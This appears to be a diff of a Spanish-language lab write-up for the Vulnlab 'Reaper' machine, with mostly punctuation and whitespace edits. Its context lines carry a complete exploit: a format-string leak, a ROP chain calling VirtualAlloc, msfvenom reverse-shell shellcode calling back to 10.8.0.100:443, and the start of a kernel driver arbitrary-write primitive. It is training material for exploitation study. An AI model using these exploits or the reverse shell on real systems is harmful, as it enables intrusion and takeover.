+rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1f37d</span><span class="p">)</span><span class="c1"> # cmove r9, rdx; mov rax, r9; ret;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora que ya establecimos los argumentos en sus respectivos registros podemos simplemente saltar a la función <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, entonces al retornar ejecutamos un gadget <code class="language-plaintext highlighter-rouge">push rsp; ret;</code> que ejecutará lo que está en el stack como un <code class="language-plaintext highlighter-rouge">jmp rsp</code></p>
+<p class="plain-text">Ahora que ya establecimos los argumentos en sus respectivos registros podemos simplemente saltar a la función <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, entonces al retornar ejecutamos un gadget <code class="language-plaintext highlighter-rouge">push rsp; ret;</code> que ejecutará lo que está en el stack como un <code class="language-plaintext highlighter-rouge">jmp rsp</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1"># call VirtualAlloc()</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x020d9</span><span class="p">)</span><span class="c1"> # pop rbx; ret;</span><span class="p">
@@ -631,10 +620,10 @@ rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1ec79</span><span class="p">)</span><span class="c1"> # jmp qword ptr [rbx];</span><span class="p">
 
 </span><span class="c1"># jmp rsp</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1becd</span><span class="p">)</span><span class="c1"> # push rsp; and al, 8; ret;  </span>
+rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1becd</span><span class="p">)</span><span class="c1"> # push rsp; and al, 8; ret;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nuestro exploit ahora se ve de esta forma, luego del offset enviamos el ropchain, luego de ejecutarla dejamos el retorno a varios qwords de <code class="language-plaintext highlighter-rouge">A's</code>, <code class="language-plaintext highlighter-rouge">B's</code> y demás</p>
+<p class="plain-text">Nuestro exploit ahora se ve de esta forma, luego del offset enviamos el ropchain, luego de ejecutarla dejamos el retorno a varios qwords de <code class="language-plaintext highlighter-rouge">A's</code>, <code class="language-plaintext highlighter-rouge">B's</code> y demás.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p64, base64
@@ -700,18 +689,18 @@ payload</span><span class="o"> +=</span><span class="p"> rop
 payload</span><span class="o"> +=</span><span class="p"> shellcode
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="o"> +</span><span class="p"> base64.b64encode(payload))  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="o"> +</span><span class="p"> base64.b64encode(payload))
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces, cuando llegamos al <code class="language-plaintext highlighter-rouge">jmp [rbx]</code> el registro <code class="language-plaintext highlighter-rouge">rbx</code> apunta a <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> y los argumentos estan establecidos de forma que cambie la protección del <code class="language-plaintext highlighter-rouge">rsp</code></p>
+<p class="plain-text">Entonces, cuando llegamos al <code class="language-plaintext highlighter-rouge">jmp [rbx]</code> el registro <code class="language-plaintext highlighter-rouge">rbx</code> apunta a <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> y los argumentos estan establecidos de forma que cambie la protección del <code class="language-plaintext highlighter-rouge">rsp</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> bp ReaperKeyCheck+0x1ec79
 
 </span><span class="ro">0:000></span><span class="p"> g
 Breakpoint 0 hit
 ReaperKeyCheck+0x1ec79:
-00007ff6`5193ec79 ff23            jmp     qword ptr [rbx] ds:00007ff6`51940000={KERNEL32!VirtualAllocStub (00007ffd`f3c73bf0)}  
+00007ff6`5193ec79 ff23            jmp     qword ptr [rbx] ds:00007ff6`51940000={KERNEL32!VirtualAllocStub (00007ffd`f3c73bf0)}
 
 </span><span class="ro">0:000></span><span class="p"> dqs rbx L1
 00007ff6`51940000  00007ffd`f3c73bf0 KERNEL32!VirtualAllocStub
@@ -729,7 +718,7 @@ r8=0000000000001000
 r9=0000000000000040</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al llegar al <code class="language-plaintext highlighter-rouge">ret</code> de la función <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> ahora el <code class="language-plaintext highlighter-rouge">rsp</code> deberia tener como protección <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READ_WRITE</code> lo que nos permitirá ejecutar un shellcode</p>
+<p class="plain-text">Al llegar al <code class="language-plaintext highlighter-rouge">ret</code> de la función <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> ahora el <code class="language-plaintext highlighter-rouge">rsp</code> deberia tener como protección <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READ_WRITE</code> lo que nos permitirá ejecutar un shellcode.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> pt
 KERNELBASE!VirtualAlloc+0x5a:
@@ -741,15 +730,15 @@ AllocationBase:    000000eb13100000
 AllocationProtect: 00000004  PAGE_READWRITE
 RegionSize:        0000000000001000
 State:             00001000  MEM_COMMIT
-Protect:           00000040  PAGE_EXECUTE_READWRITE  
+Protect:           00000040  PAGE_EXECUTE_READWRITE
 Type:              00020000  MEM_PRIVATE</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Cuando avanzamos al gadget <code class="language-plaintext highlighter-rouge">push rsp; ret;</code> hay 2 qwords en el stack que fueron modificados durante la ejecución por lo que retornará a una dirección inválida</p>
+<p class="plain-text">Cuando avanzamos al gadget <code class="language-plaintext highlighter-rouge">push rsp; ret;</code> hay 2 qwords en el stack que fueron modificados durante la ejecución por lo que retornará a una dirección inválida.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> p
 ReaperKeyCheck+0x1becd:
-00007ff6`5193becd 54              push    rsp  
+00007ff6`5193becd 54              push    rsp
 
 </span><span class="ro">0:000></span><span class="p"> dqs rsp L4
 000000eb`131fed38  000000eb`131fe000
@@ -758,22 +747,22 @@ ReaperKeyCheck+0x1becd:
 000000eb`131fed50  44444444`44444444</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para arreglarlo evitaremos <code class="language-plaintext highlighter-rouge">2</code> qwords con un <code class="language-plaintext highlighter-rouge">add rsp, 0x10</code> antes de saltar al <code class="language-plaintext highlighter-rouge">rsp</code></p>
+<p class="plain-text">Para arreglarlo evitaremos <code class="language-plaintext highlighter-rouge">2</code> qwords con un <code class="language-plaintext highlighter-rouge">add rsp, 0x10</code> antes de saltar al <code class="language-plaintext highlighter-rouge">rsp</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1"># jmp rsp</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x02029</span><span class="p">)</span><span class="c1"> # add rsp, 0x10; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x0</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 2</span><span class="c1">               # padding for add</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1becd</span><span class="p">)</span><span class="c1"> # push rsp; and al, 8; ret;  </span>
+rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1becd</span><span class="p">)</span><span class="c1"> # push rsp; and al, 8; ret;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora al llegar al <code class="language-plaintext highlighter-rouge">push rsp; ret;</code> ejecutará los qwords que enviamos como shellcode</p>
+<p class="plain-text">Ahora al llegar al <code class="language-plaintext highlighter-rouge">push rsp; ret;</code> ejecutará los qwords que enviamos como shellcode.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> bp ReaperKeyCheck + 0x1becd
 
 </span><span class="ro">0:000></span><span class="p"> g
 Breakpoint 0 hit
 ReaperKeyCheck+0x1becd:
-00007ff6`5193becd 54              push    rsp  
+00007ff6`5193becd 54              push    rsp
 
 </span><span class="ro">0:000></span><span class="p"> dqs rsp L4
 00000087`27afee00  41414141`41414141
@@ -782,9 +771,9 @@ ReaperKeyCheck+0x1becd:
 00000087`27afee18  44444444`44444444</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Luego de ejecutar el ropchain solo nos queda crear un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code>, en este caso crearemos uno que nos envie una revshell en caso de que se ejecute</p>
+<p class="plain-text">Luego de ejecutar el ropchain solo nos queda crear un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code>, en este caso crearemos uno que nos envíe una revshell en caso de que se ejecute.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/shell_reverse_tcp LHOST=10.8.0.100 LPORT=443 -f python -v shellcode  
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/shell_reverse_tcp LHOST=10.8.0.100 LPORT=443 -f python -v shellcode
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -835,7 +824,7 @@ shellcode += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
 shellcode += b"\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El exploit inicia obteniendo la dirección base del binario a través del format string, luego explotamos el buffer overflow que hace ejecutable el <code class="language-plaintext highlighter-rouge">rsp</code> con el ropchain, al final salta al stack y ejecuta el shellcode que nos enviará una reverse shell</p>
+<p class="plain-text">El exploit inicia obteniendo la dirección base del binario a través del format string, luego explotamos el buffer overflow que hace ejecutable el <code class="language-plaintext highlighter-rouge">rsp</code> con el ropchain, al final salta al stack y ejecuta el shellcode que nos enviará una reverse shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p64, base64
@@ -934,14 +923,14 @@ payload</span><span class="o"> +=</span><span class="p"> rop
 payload</span><span class="o"> +=</span><span class="p"> shellcode
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="o"> +</span><span class="p"> base64.b64encode(payload))  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="o"> +</span><span class="p"> base64.b64encode(payload))
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Finalmente al ejecutar nuestro exploit de forma remota obtenemos una reverse shell</p>
+<p class="plain-text">Finalmente al ejecutar nuestro exploit de forma remota obtenemos una reverse shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.122.10 on port 4141: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.122.10 on port 4141: Done
 [</span><span class="az">*</span><span class="p">] Closed connection to 10.10.122.10 port 4141</span>
 </code></pre></div></div><br>
 
@@ -950,7 +939,7 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span>
 Listening on 0.0.0.0 443
 Connection received on 10.10.122.10 49824
 Microsoft Windows [Version 10.0.19045.3208]
-(c) Microsoft Corporation. All rights reserved.  
+(c) Microsoft Corporation. All rights reserved.
 
 C:\> </span><span class="am">whoami</span><span class="p">
 reaper\keysvc
@@ -962,7 +951,7 @@ C:\></span>
 <section class="post" id="shell-system">
 <br><h3 class="post-title">Shell - system</h3><br>
 
-<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">C:\driver</code> podemos encontrar un archivo llamado <code class="language-plaintext highlighter-rouge">reaper.sys</code> que probablemente es un driver personalizado corriendo dentro de la máquina</p>
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">C:\driver</code> podemos encontrar un archivo llamado <code class="language-plaintext highlighter-rouge">reaper.sys</code> que probablemente es un driver personalizado corriendo dentro de la máquina.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">PS C:\driver></span><span class="am"> dir</span><span class="p">
 
@@ -970,32 +959,32 @@ C:\></span>
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
--a----         7/27/2023   9:12 AM           8432 reaper.sys  
+-a----         7/27/2023   9:12 AM           8432 reaper.sys
 
 PS C:\driver></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Abrimos el driver en <code class="language-plaintext highlighter-rouge">IDA</code>, la función <code class="language-plaintext highlighter-rouge">DriverEntry</code> inicia llamando a 2 funciones sin simbolos, la primera solo comprueba una cookie asi que vamos con la segunda</p>
+<p class="plain-text">Abrimos el driver en <code class="language-plaintext highlighter-rouge">IDA</code>, la función <code class="language-plaintext highlighter-rouge">DriverEntry</code> inicia llamando a 2 funciones sin simbolos, la primera solo comprueba una cookie asi que vamos con la segunda.</p>
 <a href="/vulnlab/reaper/23.png" target="_blank"><div><p><img src="/vulnlab/reaper/23.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">sub_11c8</code> inicia llamando a <code class="language-plaintext highlighter-rouge">RtlGetVersion</code> que se utiliza para obtener información sobre el sistema operativo que se está ejecutando actualmente</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">sub_11c8</code> inicia llamando a <code class="language-plaintext highlighter-rouge">RtlGetVersion</code> que se utiliza para obtener información sobre el sistema operativo que se está ejecutando actualmente.</p>
 <a href="/vulnlab/reaper/24.png" target="_blank"><div><p><img src="/vulnlab/reaper/24.png"></p></div></a>
 
-<p class="plain-text">La interfaz con la que podemos comunicarnos con el driver son las llamadas <code class="language-plaintext highlighter-rouge">ioctl</code>, al instalar un driver utilizando la función <code class="language-plaintext highlighter-rouge">IoCreateDevice</code> se establece un nombre de dispositivo, en el siguiente bloque podemos ver que se establece a <code class="language-plaintext highlighter-rouge">\\\\.\\Reaper</code></p>
+<p class="plain-text">La interfaz con la que podemos comunicarnos con el driver son las llamadas <code class="language-plaintext highlighter-rouge">ioctl</code>, al instalar un driver utilizando la función <code class="language-plaintext highlighter-rouge">IoCreateDevice</code> se establece un nombre de dispositivo, en el siguiente bloque podemos ver que se establece a <code class="language-plaintext highlighter-rouge">\\\\.\\Reaper</code>.</p>
 <a href="/vulnlab/reaper/25.png" target="_blank"><div><p><img src="/vulnlab/reaper/25.png"></p></div></a>
 
-<p class="plain-text">Cada función se identifica con un código <code class="language-plaintext highlighter-rouge">ioctl</code>, el driver acepta este tipo de llamadas usando estructuras de tipo <code class="language-plaintext highlighter-rouge">IRP</code> o <code class="language-plaintext highlighter-rouge">I/O Request Packets</code>, en este bloque podemos ver que la función establecida para encargarse de esta tarea es <code class="language-plaintext highlighter-rouge">sub_1020</code>, esta inicia haciendo comparaciones de varios códigos ioctl con sus saltos condicionales</p>
+<p class="plain-text">Cada función se identifica con un código <code class="language-plaintext highlighter-rouge">ioctl</code>, el driver acepta este tipo de llamadas usando estructuras de tipo <code class="language-plaintext highlighter-rouge">IRP</code> o <code class="language-plaintext highlighter-rouge">I/O Request Packets</code>, en este bloque podemos ver que la función establecida para encargarse de esta tarea es <code class="language-plaintext highlighter-rouge">sub_1020</code>, esta inicia haciendo comparaciones de varios códigos ioctl con sus saltos condicionales.</p>
 <a href="/vulnlab/reaper/26.png" target="_blank"><div><p><img src="/vulnlab/reaper/26.png"></p></div></a>
 
-<p class="plain-text">Si el código ioctl es <code class="language-plaintext highlighter-rouge">0x80002003</code> realiza una comparación de un valor <code class="language-plaintext highlighter-rouge">Magic</code> con el dword <code class="language-plaintext highlighter-rouge">0x6a55cc9e</code>, si se cumple llama <code class="language-plaintext highlighter-rouge">ExAllocatePoolWithTag</code> que asigna un espacio en memoria del tipo <code class="language-plaintext highlighter-rouge">NonPagedPool</code> con un tamaño total de <code class="language-plaintext highlighter-rouge">0x20</code> y el tag <code class="language-plaintext highlighter-rouge">paeR</code></p>
+<p class="plain-text">Si el código ioctl es <code class="language-plaintext highlighter-rouge">0x80002003</code> realiza una comparación de un valor <code class="language-plaintext highlighter-rouge">Magic</code> con el dword <code class="language-plaintext highlighter-rouge">0x6a55cc9e</code>, si se cumple llama <code class="language-plaintext highlighter-rouge">ExAllocatePoolWithTag</code> que asigna un espacio en memoria del tipo <code class="language-plaintext highlighter-rouge">NonPagedPool</code> con un tamaño total de <code class="language-plaintext highlighter-rouge">0x20</code> y el tag <code class="language-plaintext highlighter-rouge">paeR</code>.</p>
 <a href="/vulnlab/reaper/27.png" target="_blank"><div><p><img src="/vulnlab/reaper/27.png"></p></div></a>
 
-<p class="plain-text">Luego de ello crea una estructura <code class="language-plaintext highlighter-rouge">ReaperData</code> con valores en diferentes offsets, el primero de ellos es el valor <code class="language-plaintext highlighter-rouge">Magic</code> que tenemos que cumplir, algunos otros valores interesantes son unas direcciones <code class="language-plaintext highlighter-rouge">Src</code> y <code class="language-plaintext highlighter-rouge">Dst</code> las cuales nos servirán mas adelante</p>
+<p class="plain-text">Luego de ello crea una estructura <code class="language-plaintext highlighter-rouge">ReaperData</code> con valores en diferentes offsets, el primero de ellos es el valor <code class="language-plaintext highlighter-rouge">Magic</code> que tenemos que cumplir, algunos otros valores interesantes son unas direcciones <code class="language-plaintext highlighter-rouge">Src</code> y <code class="language-plaintext highlighter-rouge">Dst</code> las cuales nos servirán mas adelante.</p>
 <a href="/vulnlab/reaper/28.png" target="_blank"><div><p><img src="/vulnlab/reaper/28.png"></p></div></a>
 
-<p class="plain-text">Podemos definirlo en <code class="language-plaintext highlighter-rouge">C</code> como una estructura donde los primeros <code class="language-plaintext highlighter-rouge">3</code> valores son <code class="language-plaintext highlighter-rouge">dwords</code>, luego un <code class="language-plaintext highlighter-rouge">dword</code> sin usar y finalmente <code class="language-plaintext highlighter-rouge">2</code> direcciones de tamaño <code class="language-plaintext highlighter-rouge">qwords</code></p>
+<p class="plain-text">Podemos definirlo en <code class="language-plaintext highlighter-rouge">C</code> como una estructura donde los primeros <code class="language-plaintext highlighter-rouge">3</code> valores son <code class="language-plaintext highlighter-rouge">dwords</code>, luego un <code class="language-plaintext highlighter-rouge">dword</code> sin usar y finalmente <code class="language-plaintext highlighter-rouge">2</code> direcciones de tamaño <code class="language-plaintext highlighter-rouge">qwords</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">typedef struct</span><span class="p"> ReaperData {  
+<code><span class="no">typedef struct</span><span class="p"> ReaperData {
     </span><span class="na">DWORD</span><span class="p"> Magic;
     </span><span class="na">DWORD</span><span class="p"> ThreadId;
     </span><span class="na">DWORD</span><span class="p"> Priority;
@@ -1005,32 +994,32 @@ PS C:\driver></span>
 } </span><span class="na">ReaperData</span><span class="p">;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Si el código ioctl es igual a <code class="language-plaintext highlighter-rouge">0x80002007</code> llama a la función <code class="language-plaintext highlighter-rouge">ExFreePoolWithTag</code> que libera el bloque de memoria del <code class="language-plaintext highlighter-rouge">pool</code> que se asigno con el tag anteriormente</p>
+<p class="plain-text">Si el código ioctl es igual a <code class="language-plaintext highlighter-rouge">0x80002007</code> llama a la función <code class="language-plaintext highlighter-rouge">ExFreePoolWithTag</code> que libera el bloque de memoria del <code class="language-plaintext highlighter-rouge">pool</code> que se asignó con el tag anteriormente.</p>
 <a href="/vulnlab/reaper/31.png" target="_blank"><div><p><img src="/vulnlab/reaper/31.png"></p></div></a>
 
-<p class="plain-text">El código <code class="language-plaintext highlighter-rouge">0x8000200b</code> llama a <code class="language-plaintext highlighter-rouge">PsLookupThreadByThreadId</code> acepta el id de un hilo y devuelve el puntero a la estructura <code class="language-plaintext highlighter-rouge">ETHREAD</code>, luego llama a <code class="language-plaintext highlighter-rouge">KeSetPriorityThread</code> establece la prioridad de tiempo de ejecución del hilo creado, finalmente llama a la función <code class="language-plaintext highlighter-rouge">ObDeferenceObject</code> disminuye el numero de referencias al objeto dado</p>
+<p class="plain-text">El código <code class="language-plaintext highlighter-rouge">0x8000200b</code> llama a <code class="language-plaintext highlighter-rouge">PsLookupThreadByThreadId</code> acepta el id de un hilo y devuelve el puntero a la estructura <code class="language-plaintext highlighter-rouge">ETHREAD</code>, luego llama a <code class="language-plaintext highlighter-rouge">KeSetPriorityThread</code> establece la prioridad de tiempo de ejecución del hilo creado, finalmente llama a la función <code class="language-plaintext highlighter-rouge">ObDeferenceObject</code> disminuye el numero de referencias al objeto dado.</p>
 <a href="/vulnlab/reaper/29.png" target="_blank"><div><p><img src="/vulnlab/reaper/29.png"></p></div></a>
 
-<p class="plain-text">Luego de mover a <code class="language-plaintext highlighter-rouge">rcx</code> el <code class="language-plaintext highlighter-rouge">Dst</code> y a <code class="language-plaintext highlighter-rouge">rax</code> el <code class="language-plaintext highlighter-rouge">Src</code> de la estructura que se creó con la asignación ejecuta un bloque que mueve el contenido de la dirección <code class="language-plaintext highlighter-rouge">Src</code> a <code class="language-plaintext highlighter-rouge">Dst</code></p>
+<p class="plain-text">Luego de mover a <code class="language-plaintext highlighter-rouge">rcx</code> el <code class="language-plaintext highlighter-rouge">Dst</code> y a <code class="language-plaintext highlighter-rouge">rax</code> el <code class="language-plaintext highlighter-rouge">Src</code> de la estructura que se creó con la asignación ejecuta un bloque que mueve el contenido de la dirección <code class="language-plaintext highlighter-rouge">Src</code> a <code class="language-plaintext highlighter-rouge">Dst</code>.</p>
 <a href="/vulnlab/reaper/30.png" target="_blank"><div><p><img src="/vulnlab/reaper/30.png"></p></div></a>
 
-<p class="plain-text">Entonces, tenemos <code class="language-plaintext highlighter-rouge">3</code> códigos ioctl, el primero asigna un espacio en memoria, el segundo la libera y el tercera copia el contenido de una fuente a un destino</p>
+<p class="plain-text">Entonces, tenemos <code class="language-plaintext highlighter-rouge">3</code> códigos ioctl, el primero asigna un espacio en memoria, el segundo la libera y el tercera copia el contenido de una fuente a un destino.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="o">#define</span><span class="na"> IOCTL_ALLOC</span><span class="mi"> 0x80002003  
-</span><span class="o">#define</span><span class="na"> IOCTL_FREE</span><span class="mi">  0x80002007  
-</span><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi">  0x8000200b  </span>
+<code><span class="o">#define</span><span class="na"> IOCTL_ALLOC</span><span class="mi"> 0x80002003
+</span><span class="o">#define</span><span class="na"> IOCTL_FREE</span><span class="mi">  0x80002007
+</span><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi">  0x8000200b</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos escribir las llamadas de la siguiente forma, se llama a <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> para comunicarse con el driver, el código de <code class="language-plaintext highlighter-rouge">ALLOC</code> escribe la estructura <code class="language-plaintext highlighter-rouge">userData</code>, con <code class="language-plaintext highlighter-rouge">COPY</code> hacemos la escritura al destino y con <code class="language-plaintext highlighter-rouge">FREE</code> liberamos el bloque de memoria</p>
+<p class="plain-text">Podemos escribir las llamadas de la siguiente forma, se llama a <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> para comunicarse con el driver, el código de <code class="language-plaintext highlighter-rouge">ALLOC</code> escribe la estructura <code class="language-plaintext highlighter-rouge">userData</code>, con <code class="language-plaintext highlighter-rouge">COPY</code> hacemos la escritura al destino y con <code class="language-plaintext highlighter-rouge">FREE</code> liberamos el bloque de memoria.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+<code><span class="p">    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> nos permite escribir un <code class="language-plaintext highlighter-rouge">qword</code>, el primer valor es <code class="language-plaintext highlighter-rouge">Magic</code> que necesitamos para cumplir la condición, a <code class="language-plaintext highlighter-rouge">ThreadId</code> le pasamos el id actual, el <code class="language-plaintext highlighter-rouge">Priority</code> podemos establecerlo a <code class="language-plaintext highlighter-rouge">0</code> y los ultimos valores son la dirección de fuente y de destino, entonces llamamos al <code class="language-plaintext highlighter-rouge">ioctl</code> de <code class="language-plaintext highlighter-rouge">ALLOC</code> para establecer la estructura, luego al de <code class="language-plaintext highlighter-rouge">COPY</code> que escribe el <code class="language-plaintext highlighter-rouge">qword</code> y libera el bloque llamando al de <code class="language-plaintext highlighter-rouge">FREE</code></p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> nos permite escribir un <code class="language-plaintext highlighter-rouge">qword</code>, el primer valor es <code class="language-plaintext highlighter-rouge">Magic</code> que necesitamos para cumplir la condición, a <code class="language-plaintext highlighter-rouge">ThreadId</code> le pasamos el id actual, el <code class="language-plaintext highlighter-rouge">Priority</code> podemos establecerlo a <code class="language-plaintext highlighter-rouge">0</code> y los últimos valores son la dirección de fuente y de destino, entonces llamamos al <code class="language-plaintext highlighter-rouge">ioctl</code> de <code class="language-plaintext highlighter-rouge">ALLOC</code> para establecer la estructura, luego al de <code class="language-plaintext highlighter-rouge">COPY</code> que escribe el <code class="language-plaintext highlighter-rouge">qword</code> y libera el bloque llamando al de <code class="language-plaintext highlighter-rouge">FREE</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> where</span><span class="p">) {  
+<code><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> where</span><span class="p">) {
     ReaperData userData;
 
     userData.Magic</span><span class="o"> =</span><span class="mi"> 0x6a55cc9e</span><span class="p">;
@@ -1039,15 +1028,15 @@ PS C:\driver></span>
